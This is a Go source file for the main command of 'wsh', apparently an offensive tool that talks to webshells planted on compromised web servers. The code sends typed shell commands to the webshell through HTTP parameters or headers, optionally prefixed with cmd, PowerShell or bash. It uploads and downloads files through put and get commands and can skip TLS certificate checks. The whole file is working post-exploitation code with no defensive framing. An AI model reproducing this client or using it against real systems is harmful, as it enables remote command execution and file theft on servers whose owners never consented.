package cmd

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/spf13/cobra"

	"github.com/spf13/viper"
)

var (
	endpoint      string
	httpMethod    string
	commandParam  string
	commandHeader string
	headerFlags   []string
	paramFlags    []string
	timeout       int
	configFile    string
	ignoreSSL     bool

	prefix     string
	trimPrefix string
	trimSuffix string

	headers map[string]string
	params  map[string]string

	client http.Client
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &cobra.Command{
	Use:   "wsh <URL> [flags]",
	Short: "A brief description of your application",
	Long: `Generate or interact to webshells:
  wsh generate jsp ...
	`,
	Run: interact,
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) < 1 {
			return errors.New("url is required")
		}

		return nil
	},
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func init() {
	cobra.OnInitialize(initConfig)

	rootCmd.Flags().StringVar(&commandParam, "param", "", "Parameter for sending command")
	rootCmd.Flags().StringVar(&commandHeader, "header", "", "Header for sending command")
	rootCmd.Flags().StringVarP(&httpMethod, "method", "X", "GET", "HTTP method: GET, POST, PUT, PATCH, DELETE")
	rootCmd.Flags().StringSliceVarP(&headerFlags, "headers", "H", []string{}, "HTTP request headers")
	rootCmd.Flags().StringSliceVarP(&paramFlags, "params", "P", []string{}, "HTTP request parameters")
	rootCmd.Flags().IntVar(&timeout, "timeout", 10, "Request timeout in seconds")
	rootCmd.Flags().StringVar(&prefix, "prefix", "", "Command prefix: 'cmd /c', 'powershell.exe', 'bash'")
	rootCmd.Flags().StringVar(&trimPrefix, "trimp", "", "Trim output prefix")
	rootCmd.Flags().StringVar(&trimSuffix, "trims", "", "Trim output suffix")
	rootCmd.Flags().BoolVarP(&ignoreSSL, "ignore-ssl", "k", false, "Ignore invalid certs")
	rootCmd.PersistentFlags().StringVarP(&configFile, "config", "c", "", "Config file")
	// viper.BindPFlag("config", rootCmd.PersistentFlags().Lookup("config"))

}

// initConfig reads in config file and ENV variables if set.
func initConfig() {
	if configFile != "" {
		// Use config file from the flag.
		viper.SetConfigFile(configFile)

		// If a config file is found, read it in.
		if err := viper.ReadInConfig(); err == nil {
			fmt.Println("Using config file:", viper.ConfigFileUsed())
		}
	}
}

func interact(cmd *cobra.Command, args []string) {

	endpoint = args[0]

	if !strings.HasPrefix(strings.ToLower(endpoint), "http") {
		endpoint = fmt.Sprintf("http://%s", endpoint)
	}

	// // Check for invalid http methods
	// if httpMethod != "GET" && httpMethod != "POST" && httpMethod != "PUT" &&
	// 	httpMethod != "PATCH" && httpMethod != "DELETE" {
	// 	fmt.Println("Invalid HTTP httpMethod. Supported httpMethods are:")
	// 	fmt.Println("\tGET, POST, PUT, PATCH, and DELETE")
	// 	os.Exit(0)
	// }

	// Parse header flags
	headers = make(map[string]string)
	// fmt.Println(headerFlags)
	for _, h := range headerFlags {
		split := strings.Split(h, ":")
		// fmt.Println(split[0])
		if len(split) != 2 {
			fmt.Printf("Invalid header: \"%s\"\n", h)
			continue
		}
		headers[split[0]] = split[1]
	}

	// Parse parameter flags
	params = make(map[string]string)
	for _, p := range paramFlags {
		split := strings.Split(p, ":")
		if len(split) != 2 {
			fmt.Printf("Invalid parameter: \"%s\"\n", p)
			continue
		}

		params[split[0]] = split[1]
	}

	// Create http client
	client = http.Client{
		Timeout: time.Duration(timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: ignoreSSL,
			},
		},
	}

	// Get host from url
	host, err := getHost(endpoint)
	if err != nil {
		fmt.Println("Invalid url")
		return
	}

	// Build prompt
	clr := color.New(color.FgGreen).SprintFunc()
	prompt := fmt.Sprintf(clr("%s> "), host)

	// Create readline instance
	l, err := readline.NewEx(&readline.Config{
		Prompt:          prompt,
		HistoryFile:     ".wsh_history",
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold: true,
	})
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer l.Close()

	// Main loop
	for {
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		switch {
		// case strings.HasPrefix(line, "get "):
		// 	fmt.Println("Download file")
		// 	fmt.Println(line)
		// case strings.HasPrefix(line, "clear"):
		// 	readline.ClearScreen()
		case line == "exit":
			os.Exit(0)
		case line == "quit":
			os.Exit(0)
		case line == "help":
			printShelp()
		default:
			// Send http request
			out, err := sendRequest(line)
			if err != nil {
				fmt.Printf("%s: %s", color.RedString("ERROR"), err.Error())
			}

			// Trim extraneous html
			if trimPrefix != "" {
				i := strings.Index(out, trimPrefix)
				if i > 0 {
					i += len(trimPrefix)
					out = out[i:]
				}
			}
			if trimSuffix != "" {
				i := strings.Index(out, trimSuffix)
				if i > 0 {
					out = out[:i]
				}
			}

			// Print output
			out = strings.TrimSpace(out)
			fmt.Println(out)
		}
	}
}

// Print interactive shell help
func printShelp() {
	fmt.Println("get <remote filepath> [local filepath]	Download file")
	fmt.Println("put <local filepath> [remote filepath]	Upload file")
	fmt.Println("exit                                  	Exits shell")
}

// Send http request
func sendRequest(cmd string) (string, error) {
	finalURL := endpoint
	var body io.Reader

	// Prepend prefix
	if prefix != "" {
		cmd = fmt.Sprintf("%s %s", strings.TrimSpace(prefix), cmd)
	}

	// If uploading file
	if strings.HasPrefix(cmd, "put ") {
		c := strings.Fields(cmd)
		fileName := c[1]

		// Open file for reading
		inFile, err := os.Open(fileName)
		if err != nil {
			return "", err
		}
		defer inFile.Close()

		reader := bufio.NewReader(inFile)
		content, _ := ioutil.ReadAll(reader)

		params["f"] = base64.StdEncoding.EncodeToString(content)

		// Create multipart form
		// b := &bytes.Buffer{}
		// writer := multipart.NewWriter(b)

		// // Add file part
		// part, err := writer.CreateFormFile("f", filepath.Base(fileName))
		// if err != nil {
		// 	return "", err
		// }

		// // Copy file to form body
		// _, err = io.Copy(part, inFile)
		// headers["Content-Type"] = writer.FormDataContentType()

		// body = b
	}

	if httpMethod == "GET" {
		data := url.Values{}

		if commandParam != "" {
			data.Set(commandParam, cmd)
		} else {
			headers[commandHeader] = cmd
		}

		for k, v := range params {
			data.Set(k, v)
		}

		if strings.Contains(endpoint, "?") {
			finalURL = fmt.Sprintf("%s&%s", endpoint, data.Encode())
		} else if len(data) == 0 {
			finalURL = endpoint
		} else {
			finalURL = fmt.Sprintf("%s?%s", endpoint, data.Encode())
		}
	} else {
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		headers["Accept"] = "*/*"
		data := url.Values{}
		if commandParam != "" {
			data.Set(commandParam, cmd)
		} else {
			headers[commandHeader] = cmd
		}
		for k, v := range params {
			data.Set(k, v)
		}
		body = strings.NewReader(data.Encode())
	}

	// Build HTTP request
	req, err := http.NewRequest(httpMethod, finalURL, body)
	if err != nil {
		return "", err
	}
	// Parse headers
	for k, v := range headers {
		req.Header.Add(k, v)
		fmt.Println(k, v)
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// If downloading file...
	if strings.HasPrefix(cmd, "get ") {
		if resp.StatusCode == 404 {
			return "", errors.New("file not found")
		} else if resp.StatusCode != 200 {
			fmt.Println(resp.StatusCode)
			rBytes, _ := ioutil.ReadAll(resp.Body)
			response := string(rBytes)
			response = strings.Trim(response, " \n")
			return "", errors.New(response)
		}

		c := strings.Fields(cmd)
		fileName := c[1]
		destPath := fileName
		if len(c) > 2 {
			destPath = c[2]
		} else {
			f := strings.Split(destPath, "\\")
			destPath = f[len(f)-1]
			f = strings.Split(destPath, "/")
			destPath = f[len(f)-1]
		}

		outFile, err := os.Create(destPath)
		if err != nil {
			return "", err
		}
		defer outFile.Close()
		// b, err := ioutil.ReadAll(resp.Body)
		// outFile.WriteString(string(b))
		// return string(b), err

		io.Copy(outFile, resp.Body)

		return fmt.Sprintf("%s downloaded to %s.\n", fileName, destPath), nil
	}

	// Read server response
	response, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(response), nil
}

func getHost(u string) (string, error) {
	t, err := url.Parse(u)
	if err != nil {
		return "", err
	}

	return t.Hostname(), nil
}
